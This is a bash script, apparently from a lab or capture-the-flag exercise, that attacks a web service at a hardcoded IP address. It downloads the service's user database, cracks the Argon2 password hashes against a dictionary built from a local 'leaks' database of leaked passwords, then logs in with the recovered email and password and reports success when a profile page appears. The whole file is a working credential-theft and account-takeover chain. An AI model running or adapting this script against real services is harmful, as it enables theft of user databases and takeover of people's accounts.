#!/bin/bash
set -euo pipefail
IFS=$'\n\t'
server="http://94.103.95.24:5004"
printf ".mode list\nSELECT password FROM passwords;\n" | sqlite3 leaks > dictionary.txt
dictionary="dictionary.txt"

curl "$server/db" 2>/dev/null > db
hash_list="$(printf ".mode list\nSELECT password FROM user ORDER BY random();\n" | sqlite3 db)"
let i=0 || true
echo "$hash_list" | while read hash; do
	let i=i+1
	printf "%s: %s" "$i" "$hash"
	set +e
	output="$(./crack_argon2.py -c "$hash" -w "$dictionary")"
	ret=$?
	set -e
	echo
	if [ $ret == 0 ]; then
		target_hash="$(echo "$output" | awk '{print $1}')"
		target_password="$(echo "$output" | awk '{print $3}')"
		target_email="$(printf "SELECT email FROM user WHERE password LIKE '$target_hash';\n" | sqlite3 db)"
		output="$(curl --data "email=$target_email&password=$target_password" "$server/login" 2>/dev/null)"
		if echo "$output" | grep profile >/dev/null; then
			echo "Success, used credentials: $target_email:$target_password"
		else
			echo "Failure"
			exit 1
		fi
		break
	fi
done
rm dictionary.txt
rm db
